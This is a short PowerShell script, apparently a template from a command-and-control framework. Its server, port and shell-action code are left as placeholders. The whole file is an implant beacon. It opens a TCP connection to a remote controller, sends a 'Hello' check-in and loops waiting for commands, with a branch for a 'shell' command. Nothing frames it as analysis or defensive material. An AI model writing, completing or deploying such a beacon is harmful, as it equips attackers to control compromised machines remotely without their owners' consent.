$server = "*1"
$port = *2

$tcpConnection = New-Object System.Net.Sockets.TcpClient($server, $port)
$tcpStream = $tcpConnection.GetStream()
$reader = New-Object System.IO.StreamReader($tcpStream)
$writer = New-Object System.IO.StreamWriter($tcpStream)
$writer.AutoFlush = $true

$buffer = new-object System.Byte[] 1024
$encoding = new-object System.Text.AsciiEncoding 

$sentIni = "false"
while($tcpConnection.Connected)
{
    # send beacon initialization command
    if($sentIni -eq "false")
    {
        $writer.Write("Hello")
        $sentIni = "true"
    }

    # wait for C2 command 
    while($tcpStream.DataAvailable)
    {
        $c2Command = $reader.Readline()

        if($c2Command -eq "shell")
        {
            *3
        }
    }
}
